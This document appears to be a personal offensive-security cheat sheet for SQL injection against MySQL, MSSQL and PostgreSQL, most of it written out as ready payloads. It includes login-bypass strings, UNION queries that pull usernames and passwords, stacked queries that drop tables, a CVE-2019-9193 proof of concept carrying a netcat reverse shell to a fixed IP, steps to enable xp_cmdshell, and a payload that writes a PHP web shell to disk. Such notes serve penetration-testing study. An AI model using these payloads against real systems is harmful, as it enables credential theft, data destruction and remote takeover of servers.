## SQL
### Links

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
- [MSSQL Cheat Sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
- [SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [From MSSQL to RCE](https://bhavsec.com/posts/mssql-rce/)
### SQLi

Only Resources you will need to get Remote code using SQLi
### MYSQL

#### Authenticated SQLi

```
SELECT version();
SELECT system_user();
show databases;

SHOW TABLES FROM database_name;
OR
use <db_name>
show tables;
describe users; # describes columns in users' table

SELECT * from <test>.<users>; # here test is DB and the user is a table in test db
SELECT user, authentication_string FROM mysql.user WHERE user = 'test';bash
```

#### Error based SQLi
```
tom' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- // # password for admin user
```

#### Union-based SQLi

```
*** injected UNION query has to include the same number of columns in the original query
*** Data types need to be compatible between each column

1) Finding the number of Columns
' ORDER BY 1-- // # Keep incrementing value of 1 to find columns

2) Finding name, user, and version
%' UNION SELECT database(), user(), @@version, null, null -- // # %' is used for closing the search parameter 
# Assume we got 5 columns on step 1, we are using 3 columns and leaving 2 as null here

2.1) Finding name, user, and version
# Sometimes column 1 is reserved for the ID field so no proper value comes and we try this instead
' UNION SELECT null, null, database(), user(), @@version  -- //

3) Enumerating table names, column names, and db_name
' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
# 1 and 5 are kept null
# we see a table called users, let's dive into that

4) Enumrating few columns from the user table found above
' UNION SELECT null, username, password, description, null FROM users -- //
```

### MSSQL

#### Authenticated SQLi

```
SELECT @@version;
SELECT name FROM sys.databases; # master, tempdb, model and msdb are default
SELECT * FROM offsec.information_schema.tables; # Returns table for offsec db
'''
offsec
dbo
users
'''
SELECT * from testuser.dbo.users; # We select dbo table schema between the db and table name
admin lab # user # pass
guest guest  # user # pass
```

#### PostgreSQL Command Execution
##### CVE-2019-9193
[PayloadAllTheThings_PostgreSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

```
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'id';

COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.193 4444 >/tmp/f';

SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

#### Extra Notes I had

```
#### Line Comments

**Comments out rest of the query.**   
Line comments are generally useful for ignoring rest of the query so you don’t have to deal with fixing the syntax.

- `--` (Postgres and MS SQL and MySQL) `DROP sampletable;--` 
- `#` (MySQL) `DROP sampletable;#`

##### Line Comments Sample SQL Injection Attacks

- Username: `admin'--`
- `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'` This is going to log you as admin user, because rest of the SQL query will be ignored.


**Executing more than one query in one transaction**. This is very useful in every injection point, especially in SQL Server back ended applications.

- `;` (MS SQL)   
    `SELECT * FROM members; DROP members--`

### If Statements

Get response based on an if statement. This is **one of the key points of Blind SQL Injection**, also can be very useful to test simple stuff blindly and **accurately**.

#### MySQL If Statement

- `IF(**_condition_,_true-part_,_false-part_**)` (M) `SELECT IF(1=1,'true','false')`

#### SQL Server If Statement

- `IF **_condition_** **_true-part_** ELSE **_false-part_**` (S)   
    `IF (1=1) SELECT 'true' ELSE SELECT 'false'`

#### PostgreSQL If Statement

- `SELECT CASE WHEN **_condition_** THEN **_true-part_** ELSE **_false-part_**` END; (P)   
    `SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;`

##### If Statement SQL Injection Attack Samples

`if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0` (S)   
This will throw an **divide by zero error** if current logged user is not **“sa” or “dbo”**.

## Union Injections

With union you do SQL queries cross-table. Basically you can poison query to return records from another table.

`SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members`   
This will combine results from both news table and members table and return all of them.

### Bypassing Login Screens (SMO+)

_SQL Injection 101_, Login tricks

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`
- ….
- Login as different user (SM*)   
    `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

#### Finding how many columns in SELECT query by **ORDER BY** **(MSO+)**

Finding column number by ORDER BY can speed up the UNION SQL Injection process.

- `ORDER BY 1--`
- `ORDER BY 2--`
- `ORDER BY N--` _so on_

# Enabling xp_cmdshell for SQL Server 2005
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
<? system($_REQUEST['cmd']); ?>

```

#### Error-Based SQL Injection

- **Goal**: To generate an error message from the SQL database.
- **Method**: Include SQL control characters or SQL code into a query.
- **Example**: Inputting `' OR 1=1 --` in a user input field. If the backend query is `SELECT * FROM users WHERE username = '[input]'`, it becomes `SELECT * FROM users WHERE username = '' OR 1=1 --'`.
- **Result**: The database returns an error or unexpected data, indicating vulnerability.

#### Union-Based SQL Injection

- **Goal**: Retrieve data from other tables.
- **Method**: Utilize the `UNION` SQL operator to combine results from multiple SELECT queries.
- **Example**: Input `UNION SELECT username, password FROM users --`.
	- ' UNION SELECT null, null, database(), user(), @@version  -- //
- **Consideration**: Columns data types and number must match between the original and UNION query.

#### Blind SQL Injection

- **Goal**: Retrieve data when no error message or data is directly returned.
- **Method**: Ask the database a true/false question and determine the answer based on the application's response.
- **Example**: Change a query to `SELECT * FROM users WHERE username = 'admin' AND 1=1 --`. If the page loads normally, the query is true. If it doesn't, the query is false.

#### Time-Based SQL Injection

- **Goal**: Gather information from a database when no data is returned to the user.
- **Method**: Use SQL commands that delay the response.
- **Example**: `'; IF (SELECT COUNT(*) FROM users) > 5 WAITFOR DELAY '0:0:10' --`. If the response is delayed, the statement is true.